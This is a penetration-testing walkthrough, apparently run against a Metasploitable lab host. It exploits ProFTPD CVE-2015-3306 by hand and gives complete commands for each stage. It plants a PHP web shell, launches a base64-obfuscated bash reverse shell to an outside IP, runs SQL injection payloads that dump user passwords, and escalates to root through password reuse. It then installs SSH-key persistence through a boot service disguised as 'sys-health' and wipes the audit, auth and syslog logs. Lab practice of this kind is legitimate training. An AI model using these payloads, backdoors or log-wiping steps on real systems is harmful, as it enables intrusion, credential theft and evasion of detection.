---
icon: face-explode
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# ProFTPD: Manual Shell Access & Root via Password Re-use

Exploiting the Pro FTPD vulnerability is often simplified using MSF Console, I’ve always been curious about the intricacies of a manual exploitation process. What’s it really like to dig into the nitty-gritty without relying on automated tools?

## <mark style="color:orange;">Vulnerability Analysis: Manual Analysis</mark>

#### **Verification: Checking if the FTP server is vulnerable**

<div align="left"><figure><img src="../../.gitbook/assets/image (205).png" alt="" width="549"><figcaption></figcaption></figure></div>

#### **Exploit DB:** Exploit is publicly available via CVE 2015-3306

<div align="left"><figure><img src="../../.gitbook/assets/image (206).png" alt="" width="563"><figcaption></figcaption></figure></div>

## <mark style="color:orange;">Exploitation</mark>

### **Remote Code Execution (Gaining a Web Shell)**

1.  Login to the FTP server and hit enter twice or enter an anonymous login (You can enter a dummy email as a password or hit enter to input an empty password)

    <div align="left"><figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure></div>
2.  Initiate the copy from process from a pseudo readable file that we will use for modification later using this command:  `site cpfr /proc/self/cmdline`&#x20;


3.  Create the RCE payload by modifying the file name that we will copy to the /tmp folder



    `site cpto /tmp/.<?php passthru($_GET["cmd"]); ?>`<br>

    <div align="left"><figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure></div>
4.  Repeat the same process for the copy to and copy from commands this time we will copy tis to the **/var/www/html** folder

    \
    **Copy from:**

    `site cpfr /tmp/.<?php passthru($GET['cmd']); ?>`&#x20;

    \
    **Copy to:**

    `site cpto /var/www/html/rce.php`



    <div align="left"><figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure></div>
5.  Confirm that the **rce.php** payload now exists



    <div align="left"><figure><img src="../../.gitbook/assets/image (37).png" alt="" width="481"><figcaption></figcaption></figure></div>
6.  Perform some web shell commands such as **whoami** to confirm that the payload is working



    `http://meta3/rce.php?cmd=whoami`



    <div align="left"><figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure></div>

### **Gaining a reverse shell**

We need to upgrade our web shell to a reverse shell so that we can perform our tasks easily

1.  Start a **netcat** listener on port 80 to catch the reverse shell `nc -lnvp 80`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure></div>
2.  Obfuscate the reverse shell payload with base 64 encoding

    `echo -n "bash -i >& /dev/tcp/172.16.16.132/80 0>&1" | base64`&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure></div>
3.  If you are familiar with URL encoding, URL encode the encoded payload below so that the browser can easily read it\
    \
    **Normal payload**

    `echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTYuMTMyLzgwIDA+JjE= | base64 -d | bash`



    **URL encoded payload**

    `echo+-n+%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTYuMTYuMTMyLzgwIDA%2BJjE%3D%22+%7C+base64+-d+%7C+bash`&#x20;



    **Note:** You can use urlencoder.io or freeformatter.com for ease of use
4.  Paste the url encoded payload on the url after the cmd syntax

    `http://meta3/rce.php?cmd=<URL encoded payload>`&#x20;



    **Actual URL:**

    `http://meta3/rce.php?cmd=echo+-n+%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTYuMTYuMTMyLzgwIDA%2BJjE%3D%22+%7C+base64+-d+%7C+bash`
5.  If your URL encoding is right, you should be able to get a shell access



    <div align="left"><figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure></div>
6.  Delete the uploaded rce.php file `rm -f rce.php`&#x20;



    ![](<../../.gitbook/assets/image (28).png>)

### **Upgrading the pseudo reverse shell to a fully interactive terminal**

For ease of access, we will upgrade our reverse shell to a fully interactive `tty` terminal

1.  Spawn an interactive shell using python

    **`python -c 'import pty; pty.spawn("/bin/bash")'`**
2. Background the terminal by pressing **`ctrl + z`**&#x20;
3.  Check the terminal you are using by typing **`echo $TERM`** and take not of the value



    <div align="left"><figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure></div>
4. Set the terminal to raw mode and disable echo then we will foreground the python interactive terminal from the background using this command: **`stty raw -echo; fg`**&#x20;
5.  Type **`reset`** and you will be prompted to enter the terminal type put the value you got from **`echo $TERM`** and hit enter again



    <div align="left"><figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure></div>
6. You should now have the full capability of a full interactive terminal where you can do autofill by using tab and other terminal capabilities.

## <mark style="color:orange;">Post Exploitation</mark>

### Pillaging

#### User Information

Payroll\_app.php showing the username and password on the form and vulnerability to SQL Injection

<div align="left"><figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption><p>payroll_app.php</p></figcaption></figure></div>

#### Security Policies

**config.inc.php** with unsecure configuration policies

<div align="left"><figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption><p>config.inc.php</p></figcaption></figure></div>

#### **High Value/Profile Targets**

With the information we gathered we will check who is our priority targets for this system

#### Performing SQL Injection

Since the **Payroll\_app** seems to be vulnerable to SQL Injection attacks we will attempt if we can bypass authentication and gather confidential information

1.  On the login page enter, we know that we will try to bypass the authentication using the command basic SQLI command **`' OR 1=1`**&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (187).png" alt="" width="563"><figcaption></figcaption></figure></div>


2.  We will use the UNION operator to query the database for passwords that might been vulnerable to password re-use.



    &#x20;**`' OR 1=1 UNION SELECT username, password, 1, 1 FROM users -- '`**&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (189).png" alt="" width="563"><figcaption><p>Hidden By the Red Box showing the passwords of the users</p></figcaption></figure></div>

### **Exploiting Password Re-use**

1.  We will get the list of users that we can test for password re-use using the command: **`getent group sudo`**&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (195).png" alt="" width="563"><figcaption></figcaption></figure></div>
2.  We will attempt to switch to the **han\_solo** user account and use the password we got from the SQLI Injection we did earlier using this command: **`su - han_solo`**&#x20;



    <div align="left"><figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure></div>
3.  Now that we were logged in as **han\_solo,** we will try to switch to root user using **`sudo -i`**&#x20;

    <div align="left"><figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure></div>

    By checking if any passwords have been re-used, we were able to escalate our privileges to root.

### **Maintaining Access**

We will attempt to maintain our access either by using ssh key injection and ensuring that this value exists on the authorized keys and re-add if removed on restart

**SSH Key Injection**

We will use the id\_ed25519 encryption method for setting up password less SSH on this server

1.  Generate a key&#x20;

    `ssh-keygen -t ed25519 -C "your_email@example.com"`&#x20;
2. Go to the path where the public key is saved, on my case this is saved on my **/home/kali/.ssh/id\_ed25519.pub**
3. Get the value of the **id\_ed25519.pub** using the `cat` command e.g `cat id_ed25519.pub`
4. Go to the home folder of the compromised user on our case its **han\_solo** `cd /home/han_solo`&#x20;
5.  List all of the folders including the hidden ones to confirm if the .ssh folder exists by using this command `ls -lha`&#x20;

    <figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
6.  Since the folder exists, we don't need to create it using `mkdir` command. We will now proceed on adding our public key

    `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILheqOWMw2fOqHCZK0nJb9gxKB2j9aTHg+Bl2NQJFeli your_email@example.com " >> /home/han_solo/.ssh/authorized_keys`
7.  Test the connection by logging in to the server using SSH from your Kali machine&#x20;

    `ssh -v han_solo@172.16.16.131`&#x20;



    <figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption><p>SSH Key session showing that our public key is accepted</p></figcaption></figure>

**Re-adding the key on reboot in case the public key is removed or the ssh folder is deleted**

1.  Change directory to **/var/lib**

    `cd /var/lib`&#x20;
2.  Create a hidden shell script

    `sudo nano .readd-keys.sh`&#x20;
3. Enter the following simple script below:

```bash
#!/bin/bash

PUB_KEY="<Your ssh-ed25519 public key>"
AUTHORIZED_KEYS="/home/han_solo/.ssh/authorized_keys"

#Create the .ssh directory if the folder does not exist

mkdir -p "$(dirname 'AUTHORIZED_KEYS')"
touch "${AUTHORIZED_KEYS}"
chmod 700 "${AUTHORIZED_KEYS}"

#Add the public keys on the list of authorized keys

if ! grep -q "${PUB_KEY}" "${AUTHORIZED_KEYS}"; then
     echo "${PUB_KEY}" >> "${AUTHORIZED_KEYS}"
     chmod 600 "${AUTHORIZED_KEYS}"
fi
```

4.  Now we will create the service that will run this script on start we will use something like sys-health to make it look legitimate

    ```
    sudo nano /etc/init.sys-health
    ```


5. Add the following script below

```bash
#!/bin/sh

SCRIPT="/var/lib/readd-keys.sh"
RUNAS=root

do_start() {
  $SCRIPT &
}

do_stop() {
  pkill -f $SCRIPT
}

case "$1" in
  start)
    do_start
    ;;
  stop)
    do_stop
    ;;
  restart)
    do_stop
    do_start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
    ;;
esac

exit 0
```

6.  Make the service file executable

    `sudo chmod +x /etc/init.d/sys-health`
7. Enable to service to start at boot\
   `sudo update-rc.d sys-health defaults`
8.  Test the service by deleting the .ssh folder

    `sudo rm -rf /home/han_solo/.ssh`
9.  Start the service

    `sudo service sys-health start`
10. Confirm that the .ssh folder exists by running `ls -lha`\
    ![](<../../.gitbook/assets/image (19).png>)
11. Confirm that your passwordless ssh still works from your Kali machine `ssh han_solo@<ip>`&#x20;

    <div align="left"><figure><img src="../../.gitbook/assets/image (20).png" alt="" width="489"><figcaption></figcaption></figure></div>

Once we confirmed that we were able to escalate our privileges and maintain access, we will proceed to cover our tracks and clear any evidence, as our proof of concept is now complete.

### **Covering tracks and clearing traces**

We will just reverse the change we made and delete required logs

**Delete the backdoor files**

1.  Delete the public key re-add script

    `sudo rm -rf /var/lib/.readd-keys.sh`
2.  Remove the sys-health service

    `sudo rm -rf /etc/init.d/sys-health`
3.  Remove the symbolic links for the sys-health service

    `sudo update-rc.d -f sys-health remove`&#x20;

**Clearing logs**

1.  Clearing **auditd** logs if installed

    ```bash
    dpkg -l | grep auditd
    sudo service auditd stop
    sudo rm -rf /var/log/audit/*
    sudo service auditd 
    ```
2.  Stop **rsyslog** service and clearing system logs

    ```bash
    sudo service rsyslog stop

    # Auth.log
    sudo truncate -s 0 /var/log/auth.log
    sudo echo -n "" > /var/log/auth.log

    # Syslog
    sudo truncate -s 0 /var/log/syslog
    sudo echo -n "" > /var/log/syslog

    # Wtmp
    sudo truncate -s 0 /var/log/wtmp
    sudo echo -n "" > /var/log/wtmp

    # Lastlog
    sudo truncate -s 0 /var/log/lastlog
    sudo echo -n "" > /var/log/lastlog

    #Confirmation if the logs has been removed
    sudo cat /var/log/auth.log
    sudo cat /var/log/syslog
    sudo cat /var/wtmp
    ```

## <mark style="color:orange;">Reporting</mark>

\
<br>
